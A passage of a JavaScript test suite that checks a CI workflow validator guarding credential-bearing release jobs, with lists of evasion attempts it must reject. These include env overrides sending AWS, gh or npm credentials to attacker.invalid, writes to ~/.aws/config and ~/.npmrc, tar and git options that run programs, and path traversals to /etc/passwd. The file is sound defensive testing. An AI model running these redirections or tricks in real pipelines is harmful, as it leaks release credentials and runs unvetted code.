	["a function shadowing aws", 'aws() { :; }', /defines a shell function named aws, which would shadow/],
	["a function shadowing test", 'test() { :; }', /defines a shell function named test, which would shadow/],
	["a function shadowing cd", 'cd() { :; }', /defines a shell function named cd, which would shadow/],
	["a function shadowing gh with the function keyword", "function gh { :; }", /defines a shell function named gh, which would shadow/],
	["a function shadowing node", "node() { :; }", /defines a shell function named node, which would shadow/],
	["calling a function that was never defined", "rewrite x", /runs rewrite, which is not on the command allowlist/],
	["gh extension", "gh extension install owner/repo", /gh may only run api, release, pr, repo here/],
	["gh alias", "gh alias set co '!node scripts/x.mjs'", /gh may only run api, release, pr, repo here/],
	["gh auth", "gh auth token", /gh may only run api, release, pr, repo here/],
	["gh config", "gh config set git_protocol ssh", /gh may only run api, release, pr, repo here/],
	["gh run", "gh run download 1", /gh may only run api, release, pr, repo here/],
	["gh from an expansion", 'gh "$SUB" x', /gh may only run api, release, pr, repo here/],
	["gh repo other than clone", "gh repo fork o/r", /gh repo may only clone here/],
	["gh repo clone passing a git config", 'gh repo clone o/r dir -- -c core.hooksPath=/tmp/h', /gh repo clone may hand git only --depth <n>/],
	["gh repo clone passing a template", "gh repo clone o/r dir -- --template=/tmp/t --depth 1", /gh repo clone may hand git only --depth <n>/],
	["gh repo clone with an expanded depth", 'gh repo clone o/r dir -- --depth "$N"', /gh repo clone may hand git only --depth <n>|--depth needs a literal number/],
	["tar --to-command", "tar --to-command=node -xf artifacts/x.tar.gz", /tar option --to-command=node runs a program/],
	["tar -I", "tar -I 'node x' -xf artifacts/x.tar.gz", /tar option -I runs a program/],
	["tar --use-compress-program", "tar --use-compress-program=node -xf artifacts/x.tar.gz", /tar option --use-compress-program=node runs a program/],
	["tar --checkpoint-action", "tar --checkpoint-action=exec=node -xf artifacts/x.tar.gz", /tar option --checkpoint-action=exec=node runs a program/],
	["curl without --proto", "curl -fsSL https://example.invalid/x", /curl must pin --proto '=https'/],
	["curl with the wrong --proto", "curl --proto '=http,https' https://example.invalid/x", /curl must pin --proto '=https'/],
	["curl with an http URL", "curl --proto '=https' http://example.invalid/x", /curl must fetch https:\/\/ URLs only/],
	["curl -K", "curl --proto '=https' -K /tmp/curlrc https://example.invalid/x", /curl option -K reads a config/],
	["curl --config", "curl --proto '=https' --config /tmp/curlrc https://example.invalid/x", /curl option --config reads a config/],
	["curl -k", "curl --proto '=https' -k https://example.invalid/x", /curl option -k reads a config, weakens TLS/],
	["curl --insecure", "curl --proto '=https' --insecure https://example.invalid/x", /curl option --insecure/],
	["curl -O", "curl --proto '=https' -O https://example.invalid/x", /curl option -O/],
	["curl --proxy", "curl --proto '=https' --proxy http://p https://example.invalid/x", /curl option --proxy/],
	["curl --resolve", "curl --proto '=https' --resolve example.invalid:443:1.2.3.4 https://example.invalid/x", /curl option --resolve/],
	["an aws endpoint override in the shell", 'AWS_ENDPOINT_URL=https://attacker.invalid aws s3 ls', /sets AWS_ENDPOINT_URL, which redirects where a credential is sent/],
	["an aws s3 endpoint override in the shell", 'export AWS_ENDPOINT_URL_S3=https://attacker.invalid', /sets AWS_ENDPOINT_URL_S3, which redirects/],
	["an aws profile", "AWS_PROFILE=other aws s3 ls", /sets AWS_PROFILE, which redirects/],
	["an aws config file", 'AWS_CONFIG_FILE=/tmp/config aws s3 ls', /sets AWS_CONFIG_FILE, which redirects/],
	["an aws credentials file", 'export AWS_SHARED_CREDENTIALS_FILE=/tmp/creds', /sets AWS_SHARED_CREDENTIALS_FILE, which redirects/],
	["an aws CA bundle", 'AWS_CA_BUNDLE=/tmp/ca.pem aws s3 ls', /sets AWS_CA_BUNDLE, which redirects/],
	["AWS_REGION", "AWS_REGION=us-east-1 aws s3 ls", /sets AWS_REGION, which redirects/],
	["a gh host", "GH_HOST=attacker.invalid gh api /user", /sets GH_HOST, which redirects/],
	["a gh config dir", "export GH_CONFIG_DIR=/tmp/gh", /sets GH_CONFIG_DIR, which redirects/],
	["a git ssh command", 'GIT_SSH_COMMAND="node x" git -C d push origin x', /sets GIT_SSH_COMMAND, which redirects/],
	["a git config env", 'GIT_CONFIG_COUNT=1 git -C d diff', /sets GIT_CONFIG_COUNT, which redirects/],
	["a git external diff", "declare -x GIT_EXTERNAL_DIFF=/tmp/x", /sets GIT_EXTERNAL_DIFF, which redirects/],
	["an npm config", "NPM_CONFIG_REGISTRY=https://attacker.invalid npm publish x.tgz --ignore-scripts", /sets NPM_CONFIG_REGISTRY, which redirects/],
	["a lowercase npm config", "npm_config_registry=https://attacker.invalid npm publish x.tgz --ignore-scripts", /sets npm_config_registry, which redirects/],
	["extra CA certs", "NODE_EXTRA_CA_CERTS=/tmp/ca.pem npm publish x.tgz --ignore-scripts", /sets NODE_EXTRA_CA_CERTS, which redirects/],
	["SSL_CERT_FILE", "SSL_CERT_FILE=/tmp/ca.pem aws s3 ls", /sets SSL_CERT_FILE, which redirects/],
	["HOME", "HOME=/tmp/home aws s3 ls", /sets HOME, which redirects/],
	["HOME read from a file", "read -r HOME < /tmp/x", /sets HOME, which redirects/],
	["a proxy", "HTTPS_PROXY=http://attacker.invalid aws s3 ls", /sets HTTPS_PROXY, which redirects/],
	["a cosign trust root", "SIGSTORE_ROOT_FILE=/tmp/root.json cosign verify-blob x", /sets SIGSTORE_ROOT_FILE, which redirects/],
	["a cosign knob", "COSIGN_EXPERIMENTAL=1 cosign verify-blob x", /sets COSIGN_EXPERIMENTAL, which redirects/],
	["an env override through env", "env AWS_ENDPOINT_URL=https://attacker.invalid aws s3 ls", /sets AWS_ENDPOINT_URL, which redirects/],
	["writing the aws config", "printf '[default]\\ncredential_process = node x\\n' > ~/.aws/config", /redirects to a configuration or credential file .*~\/\.aws\/config/],
	["writing the aws config through $HOME", 'printf x > "$HOME/.aws/config"', /redirects to a configuration or credential file .*\$HOME\/\.aws\/config/],
	["writing the aws config through ${HOME}", 'cat x > "${HOME}/.aws/credentials"', /redirects to a configuration or credential file/],
	["writing the aws config with tee", "echo x | tee ~/.aws/config", /names a configuration or credential file .*~\/\.aws\/config/],
	["writing .npmrc", "echo '//registry.npmjs.org/:_authToken=x' > ~/.npmrc", /redirects to a configuration or credential file/],
	["writing .gitconfig", 'git -C d -c user.name=x -c user.email=y commit -am x > "$HOME/.gitconfig"', /redirects to a configuration or credential file/],
	["copying into .config/gh", "cp x ~/.config/gh/hosts.yml", /names a configuration or credential file/],
	["a relative .aws directory", "mkdir -p .aws && cp x .aws/config", /names a configuration or credential file/],
	["downloading over the aws config", 'aws s3 cp "s3://${R2_BUCKET}/x" ~/.aws/config --endpoint-url "$R2_ENDPOINT_URL"', /names a configuration or credential file/],
	["a git upload-pack program", "git -C d ls-remote --upload-pack='node x' origin", /git option --upload-pack=node x names a program/],
	["a git upload-pack program (-u)", "git -C d ls-remote -u 'node x' origin", /git option -u names a program/],
	["a git receive-pack program", "git -C d push --receive-pack='node x' origin x", /git option --receive-pack=node x names a program/],
	["a git exec-path", "git --exec-path=/tmp/x -C d diff", /git may carry only -C <dir> and -c user\.name=/],
	["a git config other than the identity", "git -C d -c core.hooksPath=/tmp/h commit -am x", /git may carry only -C <dir> and -c user\.name=/],
	["a git alias that runs code", "git -C d -c alias.diff='!node x' diff", /git may carry only -C <dir> and -c user\.name=/],
	["a git config from an expansion", 'git -C d -c "$KEY" diff', /git may carry only -C <dir> and -c user\.name=/],
	["a git subcommand off the list", "git -C d clone https://example.invalid/x", /git may only run symbolic-ref, ls-remote, switch, diff, commit, push/],
	["git submodule", "git -C d submodule update --init", /git may only run/],
	["git config", "git -C d config core.hooksPath /tmp/h", /git may only run/],
	["a git subcommand from an expansion", 'git -C d "$SUB"', /git may only run/],
	["git --no-verify", "git -C d commit --no-verify -am x", /git option --no-verify names a program/],
	["git with a work tree", "git -C d --work-tree=/tmp/x diff", /git may carry only -C <dir>/],
];

test("credential-bearing jobs may run only the allowlisted commands; every interpreter, wrapper and path is refused (round 5, finding 1)", () => {
	for (const [label, script, pattern] of INTERPRETER_EVASIONS_ROUND_5) {
		const reasons = credentialStepReasons(script, { artifactDirectories: ["artifacts"], jobId: "tap-bump" });
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The per-job tools are allowed where the job exists to run them and nowhere else.
	const only = (command, jobs) => {
		for (const jobId of ALL_CREDENTIAL_JOBS) {
			const reasons = commandAllowlistReasons([...shellCommands(command)][0], { jobId });
			if (jobs.includes(jobId)) assert.deepEqual(reasons, [], `${command} in ${jobId}`);
			else assert.match(reasons.join("\n"), /is not on the command allowlist/, `${command} in ${jobId}`);
		}
	};
	only('aws s3 ls "s3://${R2_BUCKET}/" --endpoint-url "$R2_ENDPOINT_URL"', ["publish-r2", "publish-beta-r2", "finalize-release"]);
	only("cosign verify-blob --bundle artifacts/SHA256SUMS.sigstore.json artifacts/SHA256SUMS", ["sign", "publish-beta-r2"]);
	only("syft scan file:x -o spdx-json=x.json", ["sign"]);
	only("npm publish x.tgz --provenance --access public --ignore-scripts", ["publish-npm"]);
	only("git -C d diff --quiet", ["tap-bump"]);
	only("sed -E 's/x/y/' f", ["tap-bump"]);
	assert.deepEqual(ALLOWED_COMMANDS["*"].filter((name) => /^(node|nodejs|python3?|perl|ruby|bash|sh|zsh|deno|bun|tsx|ts-node|awk|env|sudo|xargs|eval|find|npm|npx|aws|git|sed)$/.test(name)), []);
	// What the checked-in jobs do is accepted, one construct at a time.
	const fine = [
		"set -euo pipefail",
		'test -n "$R2_BUCKET"',
		'prefix="releases/v${PRODUCTION_VERSION}"',
		"content_type() {\n  case \"$1\" in\n    *.tar.gz|*.tgz) echo application/gzip ;;\n    *.json) echo application/json ;;\n    *) echo text/plain ;;\n  esac\n}\nfor file in artifacts/*; do\n  name=$(basename \"$file\")\n  case \"$name\" in\n    stable|latest.json) continue ;;  # channel pointers are not immutable\n  esac\n  echo \"$(content_type \"$name\")\"\ndone",
		"while IFS=$'\\t' read -r name digest; do\n  test -f \"artifacts/$name\"\n  count=$((count + 1))\ndone < <(jq -r '.[] | [.name, .digest] | @tsv' manifest/github-assets.json)",
		'[[ "$BUILD_REF" =~ ^[0-9a-f]{40}$ ]] || { echo "BUILD_REF is not a full commit SHA: $BUILD_REF" >&2; exit 1; }',
		'resolve_tag_commit() {\n  local tag="$1" ref type sha\n  if ! ref=$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/${tag}" 2>/tmp/ref-error); then\n    if grep -q \'HTTP 404\' /tmp/ref-error; then return 0; fi\n    cat /tmp/ref-error >&2\n    return 1\n  fi\n  if [ "$(jq -r .ref <<<"$ref")" != "refs/tags/${tag}" ]; then\n    return 1\n  fi\n  printf \'%s\\n\' "$sha"\n}\ntagged=$(resolve_tag_commit "$TAG")',
		"gh release edit \"$TAG\" --draft=false --latest",
		"gh api --method POST \"repos/${GITHUB_REPOSITORY}/git/refs\" -f ref=\"refs/tags/${TAG}\" -f sha=\"$BUILD_REF\" >/dev/null",
		"gh pr create --repo \"$TAP_REPO\" --head \"$branch\" --base \"$default_branch\" --title \"$title\" --body \"$body\"",
		'gh repo clone "$TAP_REPO" "$workdir" -- --depth 1',
		"names=()\nwhile IFS= read -r name; do names+=(\"$name\"); done < <(jq -r '.publishOrder[]' npm-packages/manifest.json)\ntest \"${#names[@]}\" -gt 0",
		"cmp -s /tmp/current-assets.json /tmp/recorded-assets.json || { diff /tmp/recorded-assets.json /tmp/current-assets.json >&2 || true; exit 1; }",
		'echo "is_head=false" >> "$GITHUB_OUTPUT"',
		"printf 'Automated beta build from `%s` (`%s`).\\n' \"$DEFAULT_BRANCH\" \"$BUILD_REF\" > /tmp/beta-release-notes.md",
		"(cd artifacts && sha256sum --check SHA256SUMS)",
		"mkdir -p signatures\ncosign sign-blob --yes --bundle signatures/SHA256SUMS.sigstore.json artifacts/SHA256SUMS",
		"workdir=$(mktemp -d)",
		'lease=$(git -C "$workdir" ls-remote --heads origin "refs/heads/${branch}" | cut -f1)',
		'git -C "$workdir" -c user.name=\'prime-agent-release\' -c user.email=\'release@primeintellect.ai\' commit -am "prime-agent ${PRODUCTION_VERSION}"',
		'git -C "$workdir" push origin "refs/heads/${branch}:refs/heads/${branch}" --force-with-lease="refs/heads/${branch}:${lease}"',
		'git -C "$workdir" switch -c "$branch"',
		'rewrite() {\n  sed -E "$1" "$formula" > "$formula.tmp"\n  mv "$formula.tmp" "$formula"\n}\nrewrite "s/x/y/"',
		"curl --proto '=https' -fsSL --retry 5 -o /tmp/x https://example.invalid/x",
		"tar -xzf artifacts/x.tar.gz -C /tmp/extracted",
		"cat <<'EOF' > /tmp/notes.md\nRelease notes for the reviewer\nEOF",
		"command -v aws",
		"true\n:\nfalse || exit 1",
	];
	for (const script of fine) {
		// Per-job tools are scoped by `only` above; here every other rule must be silent.
		assert.deepEqual(credentialStepReasons(script, { artifactDirectories: ["artifacts", "manifest", "npm-packages"], jobId: "tap-bump" }).filter((reason) => !/^runs (aws|cosign|syft|npm), which is not on the command allowlist/.test(reason)), [], script);
	}
	// Patterns are data: a `case` arm naming an interpreter is not a call, and a pattern list on
	// its own line does not start a command.
	assert.deepEqual([...shellCommands("case \"$x\" in\n  node|python3) echo interpreter ;;\n  *) echo other ;;\nesac")].filter((command) => command.casePattern).map((command) => command.words.map((word) => word.text)), [["node"], ["python3"], ["*"]]);
	assert.deepEqual(credentialStepReasons("case \"$x\" in\n  node|python3) echo interpreter ;;\n  *) echo other ;;\nesac", { jobId: "publish-r2" }), []);
	// ...but the body of an arm is a command like any other.
	assert.match(credentialStepReasons("case \"$x\" in\n  a) node -e 1 ;;\nesac", { jobId: "publish-r2" }).join("\n"), /runs node, which is not on the command allowlist/);
	assert.match(credentialStepReasons("case \"$x\" in\n  a)\n    node -e 1\n    ;;\nesac", { jobId: "publish-r2" }).join("\n"), /runs node, which is not on the command allowlist/);
	assert.match(credentialStepReasons("case \"$x\" in a) node -e 1 ;; esac", { jobId: "publish-r2" }).join("\n"), /runs node, which is not on the command allowlist/);
	// `case X` with `in` on the next line is not recognised, so the pattern reads as a command: fail closed.
	assert.match(credentialStepReasons("case \"$x\"\nin\n  a) echo ;;\nesac", { jobId: "publish-r2" }).join("\n"), /runs a, which is not on the command allowlist/);
	// A function is callable once defined; its name may not be an allowlisted command.
	assert.deepEqual(credentialStepReasons("helper() { echo hi; }\nhelper", { jobId: "publish-r2" }), []);
	assert.match(credentialStepReasons("helper\nhelper() { echo hi; }", { jobId: "publish-r2" }).join("\n"), /runs helper, which is not on the command allowlist/);
	// The word splitter marks the definition and the pattern words.
	assert.deepEqual(splitWords("aws() { command aws \"$@\"; }").commands.map((command) => command.words.map((word) => `${word.text}${word.definesFunction ? "()" : ""}`)), [["aws()"], ["{"], ["command", "aws", "$@"], ["}"]]); // a bare `{` ends the command so a group body is inspected on its own (round 6, finding 7)
	assert.deepEqual([...shellCommands("cat <<EOF\nnot a command\nEOF")].map((command) => [command.words.map((word) => word.text).join(" "), command.heredoc ?? false]), [["cat", false], ["not a command", true]]);
});

/** The evasions every credential-bearing job is exercised against in the workflow; the full list runs for publish-r2 and tap-bump. */
const INTERPRETER_SMOKE_ROUND_5 = INTERPRETER_EVASIONS_ROUND_5.filter(([label]) =>
	/^(node -e concatenating|node -e$|python3 -c|python -c|perl -e|ruby -e|a concatenated interpreter|node through env|a path to node|a function shadowing aws|gh extension|an aws endpoint override in the shell|writing the aws config$|a git upload-pack program$)/.test(label),
);
assert.equal(INTERPRETER_SMOKE_ROUND_5.length, 14);

for (const jobId of ALL_CREDENTIAL_JOBS) {
	test(`no interpreter, wrapper, path or off-list command runs inside credential-bearing job ${jobId} (round 5, finding 1)`, () => {
		const evasions = jobId === "publish-r2" || jobId === "tap-bump" ? INTERPRETER_EVASIONS_ROUND_5 : INTERPRETER_SMOKE_ROUND_5;
		for (const [label, script, pattern] of evasions) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in code", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			// git and sed are only allowed in tap-bump; elsewhere the whole command is off the list, which is the stronger finding.
			const accepted = (problem) => pattern.test(problem) || (jobId !== "tap-bump" && /is not on the command allowlist/.test(problem));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && accepted(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
		// The env: form of the same redirections.
		for (const [name, value] of [["AWS_ENDPOINT_URL", "https://attacker.invalid"], ["AWS_ENDPOINT_URL_S3", "https://attacker.invalid"], ["AWS_PROFILE", "other"], ["AWS_CONFIG_FILE", "/tmp/config"], ["GH_HOST", "attacker.invalid"], ["GIT_SSH_COMMAND", "node x"], ["NPM_CONFIG_REGISTRY", "https://attacker.invalid"], ["HOME", "/tmp/home"], ["SIGSTORE_ROOT_FILE", "/tmp/root.json"]]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Redirect\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes(`sets ${name}, which redirects`)), `${name} in ${jobId}:\n${problems.join("\n")}`);
			const jobLevel = mutate(RELEASE, (text) => {
				const start = text.indexOf(`\n  ${jobId}:\n`);
				const stepsAt = text.indexOf("\n    steps:\n", start);
				return `${text.slice(0, stepsAt)}\n    env:\n      ${name}: '${value}'${text.slice(stepsAt)}`;
			});
			// (a second env: block is a YAML duplicate-key error for jobs that already have one; the checker must still refuse, one way or another)
			assert.throws(() => assert.deepEqual(checkWorkflows(reader({ [RELEASE]: jobLevel })), []), `${name} at job level in ${jobId}`);
		}
	});
}

test("the checked-in credential-bearing jobs use only allowlisted commands, and the allowlist names nothing that runs code", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	for (const [jobId, job] of Object.entries(release.jobs)) {
		if (!isCredentialBearing(job)) continue;
		const artifactDirectories = artifactDirectoriesOf(job);
		for (const step of job.steps ?? []) {
			assert.deepEqual(credentialStepReasons(String(step.run ?? ""), { artifactDirectories, jobId }), [], `${jobId}: ${step.name}`);
		}
	}
	for (const jobId of ALL_CREDENTIAL_JOBS) assert.ok(isCredentialBearing(release.jobs[jobId]), jobId);
	assert.deepEqual(checkWorkflows(), []);
});

const AWS_ENDPOINT_EVASIONS = [
	["another endpoint", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url https://attacker.invalid', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL".*never https:\/\/attacker\.invalid/],
	["another variable", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$OTHER_ENDPOINT"', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL".*never \$OTHER_ENDPOINT/],
	["a literal that spells the variable name", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url \'$R2_ENDPOINT_URL\'', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL"/],
	["a command substitution", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$(cat /tmp/e)"', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL"/],
	["a suffix on the variable", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "${R2_ENDPOINT_URL}.attacker.invalid"', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL"/],
	["no endpoint at all", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --quiet', /must carry --endpoint-url "\$R2_ENDPOINT_URL" exactly once \(found 0\)/],
	["two endpoints", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --endpoint-url "$R2_ENDPOINT_URL"', /exactly once \(found 2\)/],
	["the --endpoint-url=value form", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url=https://attacker.invalid', /carries an option the checker does not allow: --endpoint-url=/],
	["--profile", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --profile other', /carries an option the checker does not allow: --profile/],
	["--region other than auto", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --region us-east-1', /--region may only be auto: us-east-1/],
	["--region from another variable", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --region "$REGION"', /--region may only be auto/],
	["--no-verify-ssl", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --no-verify-ssl', /carries an option the checker does not allow: --no-verify-ssl/],
	["--ca-bundle", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --ca-bundle /tmp/ca.pem', /carries an option the checker does not allow: --ca-bundle/],
	["--debug", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --debug', /carries an option the checker does not allow: --debug/],
	["--no-sign-request", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --no-sign-request', /carries an option the checker does not allow: --no-sign-request/],
	["an option from an expansion", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" "$EXTRA"', /exactly one source and one destination|option the checker does not allow/],
	["a download to another endpoint", 'aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/x --endpoint-url https://attacker.invalid', /--endpoint-url must be exactly/],
	["a download without an endpoint", 'aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/x --quiet', /exactly once \(found 0\)/],
	["head-object to another endpoint", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key" --endpoint-url https://attacker.invalid', /--endpoint-url must be exactly/],
	["head-object without an endpoint", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key"', /exactly once \(found 0\)/],
	["head-object with --profile", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key" --endpoint-url "$R2_ENDPOINT_URL" --profile other', /carries an option the checker does not allow: --profile/],
	["head-object with --no-verify-ssl", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key" --endpoint-url "$R2_ENDPOINT_URL" --no-verify-ssl', /carries an option the checker does not allow: --no-verify-ssl/],
	["ls without an endpoint", 'aws s3 ls "s3://${R2_BUCKET}/"', /exactly once \(found 0\)/],
	["ls to another endpoint", 'aws s3 ls "s3://${R2_BUCKET}/" --endpoint-url https://attacker.invalid', /--endpoint-url must be exactly/],
	["AWS_ENDPOINT_URL as a prefix", 'AWS_ENDPOINT_URL=https://attacker.invalid aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"', /sets AWS_ENDPOINT_URL, which redirects/],
	["AWS_ENDPOINT_URL_S3 exported", 'export AWS_ENDPOINT_URL_S3=https://attacker.invalid\naws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"', /sets AWS_ENDPOINT_URL_S3, which redirects/],
	["AWS_DEFAULT_REGION reassigned", 'AWS_DEFAULT_REGION=us-east-1; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --region "$AWS_DEFAULT_REGION"', /reassigns AWS_DEFAULT_REGION/],
	["R2_ENDPOINT_URL reassigned", 'R2_ENDPOINT_URL=https://attacker.invalid; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"', /reassigns R2_ENDPOINT_URL/],
];

test("every aws invocation in a publish job goes to --endpoint-url \"$R2_ENDPOINT_URL\" and nowhere else (round 5, finding 2)", () => {
	const options = { artifactDirectories: ["artifacts", "manifest"] };
	for (const [label, script, pattern] of AWS_ENDPOINT_EVASIONS) {
		const reasons = [...r2StepReasons("publish-r2", script, options).reasons, ...credentialStepReasons(script, { ...options, jobId: "publish-r2" })];
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The checked-in aws lines all carry the pin.
	const release = parse(readFileSync(RELEASE, "utf8"));
	let count = 0;
	for (const jobId of Object.keys(R2_WRITERS)) {
		for (const step of release.jobs[jobId].steps ?? []) {
			for (const command of shellCommands(String(step.run ?? ""))) {
				const texts = command.words.map((word) => word.text);
				const at = texts.indexOf("aws");
				if (at === -1 || command.casePattern) continue;
				count += 1;
				const endpoint = texts.indexOf("--endpoint-url", at);
				assert.ok(endpoint !== -1, `${jobId} ${step.name}: ${texts.join(" ")}`);
				assert.equal(texts[endpoint + 1], "$R2_ENDPOINT_URL", `${jobId} ${step.name}: ${texts.join(" ")}`);
			}
		}
	}
	assert.ok(count >= 10, `found ${count} aws invocations`);
	// The step env may not point the CLI elsewhere either: every AWS_* the R2 steps set is checked.
	for (const [jobId, name, value, expected] of [
		["publish-r2", "AWS_ENDPOINT_URL", "https://attacker.invalid", "sets AWS_ENDPOINT_URL, which redirects"],
		["publish-r2", "AWS_ENDPOINT_URL_S3", "https://attacker.invalid", "sets AWS_ENDPOINT_URL_S3, which redirects"],
		["publish-beta-r2", "AWS_PROFILE", "other", "sets AWS_PROFILE, which redirects"],
		["finalize-release", "AWS_CA_BUNDLE", "/tmp/ca.pem", "sets AWS_CA_BUNDLE, which redirects"],
		["publish-r2", "AWS_DEFAULT_REGION", "us-east-1", "sets AWS_DEFAULT_REGION to 'us-east-1'; R2 only takes the region 'auto'"],
		["publish-beta-r2", "AWS_REGION", "us-east-1", "sets AWS_REGION, which redirects"],
	]) {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Redirect the CLI\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes(expected)), `${jobId} ${name}=${value}:\n${problems.join("\n")}`);
	}
	// Changing the checked-in pin is a workflow failure.
	for (const [jobId, from, to] of [
		["publish-r2", '            aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" \\\n              --endpoint-url "$R2_ENDPOINT_URL" \\\n', '            aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" \\\n              --endpoint-url "https://attacker.invalid" \\\n'],
		["publish-r2", '            aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" \\\n              --endpoint-url "$R2_ENDPOINT_URL" \\\n', '            aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" \\\n'],
		["publish-beta-r2", '            aws s3api head-object --bucket "$R2_BUCKET" --key "$key" \\\n              --endpoint-url "$R2_ENDPOINT_URL" >/tmp/head.json', '            aws s3api head-object --bucket "$R2_BUCKET" --key "$key" \\\n              --endpoint-url "$OTHER" >/tmp/head.json'],
		["finalize-release", '          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" \\\n            --endpoint-url "$R2_ENDPOINT_URL"', '          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" \\\n            --endpoint-url "$R2_ENDPOINT_URL" --profile other'],
	]) {
		const broken = mutate(RELEASE, (text) => {
			const start = text.indexOf(`\n  ${jobId}:\n`);
			const index = text.indexOf(from, start);
			assert.ok(index > start, `${jobId} contains the anchor`);
			return `${text.slice(0, index)}${to}${text.slice(index + from.length)}`;
		});
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && /--endpoint-url|--profile/.test(problem)), `${jobId}:\n${problems.join("\n")}`);
	}
});

for (const jobId of ["publish-r2", "publish-beta-r2", "finalize-release"]) {
	test(`an aws invocation pointed elsewhere inside ${jobId} is rejected in the workflow (round 5, finding 2)`, () => {
		for (const [label, script, pattern] of AWS_ENDPOINT_EVASIONS) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in an endpoint", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	});
}

const SOURCE_PATH_EVASIONS = [
	["a traversal through the artifact directory", "artifacts/../scripts/x.mjs"],
	["a traversal after a real file", "artifacts/x/../../etc/passwd"],
	["a dot segment", "artifacts/./x"],
	["a leading dot segment", "./artifacts/x"],
	["a leading slash", "/artifacts/x"],
	["a tilde", "~/artifacts/x"],
	["a tilde-user", "~runner/artifacts/x"],
	["an empty segment", "artifacts//x"],
	["the directory itself", "artifacts"],
	["the directory with a trailing slash", "artifacts/"],
	["a sibling with the same prefix", "artifacts-evil/x"],
	["a trailing dot-dot", "artifacts/x/.."],
